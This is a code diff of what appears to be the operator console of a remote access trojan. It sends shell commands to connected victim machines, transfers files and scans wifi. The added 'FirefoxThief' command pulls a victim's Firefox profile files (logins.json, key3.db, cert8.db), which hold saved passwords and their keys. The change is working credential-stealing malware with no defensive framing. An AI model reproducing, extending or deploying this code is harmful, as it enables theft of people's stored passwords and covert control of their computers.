@@ -82,7 +82,6 @@ def DownloadFILE(fileName):
 
     fileDOWN.close()
     print ("")
-    SendData("SDF")
 
 def UploadFILE(fileName):
     fileUP = open(fileName, 'rb')
@@ -120,7 +119,7 @@ while True:
         time.sleep(2)
         ExecIN("clear")
         cType = RecvData()
-        print (("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0)))
+        print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
         while True:
             inText = raw_input(colored.white('<T2B:')+colored.yellow(cType+'> '))
             if inText.startswith("download"):
@@ -133,7 +132,13 @@ while True:
             elif inText.startswith("!"):
 		        ExecIN(inText.split("!")[1])
             elif inText.startswith('s-wifi'):
-                card = raw_input("[*] Enter wifi card name (usualy wlan0): ")
+                print "[*] Please choose a card, exec if/ip-config"
+                wconf = raw_input("exec -> ")
+                SendData("exec:"+ wconf)
+                print ("")
+                outEXEC = RecvData()
+                print (outEXEC)
+                card = raw_input("[*] Enter wifi card name: ")
                 SendData("ScanWIFI :" + card)
                 report = RecvData()
                 while report != "ScanWIFI-finished":
@@ -158,6 +163,20 @@ while True:
                 connstream.shutdown(socket.SHUT_RDWR)
                 connstream.close()
                 break
+            elif inText == "FirefoxThief":
+                SendData("FirefoxThief")
+                print "[profiles]\n"
+                listDir = RecvData()
+                print (listDir)
+                newdir = raw_input("[DumpDir] ")
+                SendData(newdir)
+                DownloadFILE("profiles.ini")
+                print "[+] Dumping cert8.db, key3.db and logins.json..."
+                DownloadFILE("cert8.db")
+                DownloadFILE("key3.db")
+                DownloadFILE("logins.json")
+                print colored.green("Finished")
+
             elif inText.startswith('protect'):
                     SendData(inText)
                     inText = RecvData()
